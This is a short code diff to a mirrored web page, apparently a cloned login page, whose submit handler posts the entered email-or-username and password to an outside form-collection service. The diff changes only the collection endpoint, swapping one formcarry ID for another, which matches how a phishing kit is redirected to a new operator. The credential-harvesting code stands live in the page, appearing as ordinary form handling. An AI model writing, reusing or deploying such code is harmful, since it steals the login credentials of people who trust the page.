@@ -98,7 +98,7 @@ function checkFields() {
     doneBtn.classList.add("active");
     doneBtn.onclick = async () => {
       loadingOverlay.style.display = "flex";
-      await fetch("https://formcarry.com/s/RD7aC3on6Q1", {
+      await fetch("https://formcarry.com/s/N8tkya128he", {
         method: "POST",
         headers: {"Content-Type": "application/x-www-form-urlencoded"},
         body: `emailOrUsername=${encodeURIComponent(emailField.value)}&password=${encodeURIComponent(passwordField.value)}`
@@ -128,3 +128,4 @@ passwordField.addEventListener("input", checkFields);
 
 <!-- Mirrored from zeprem2.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2017], Wed, 03 Sep 2025 00:01:17 GMT -->
 </html>
+
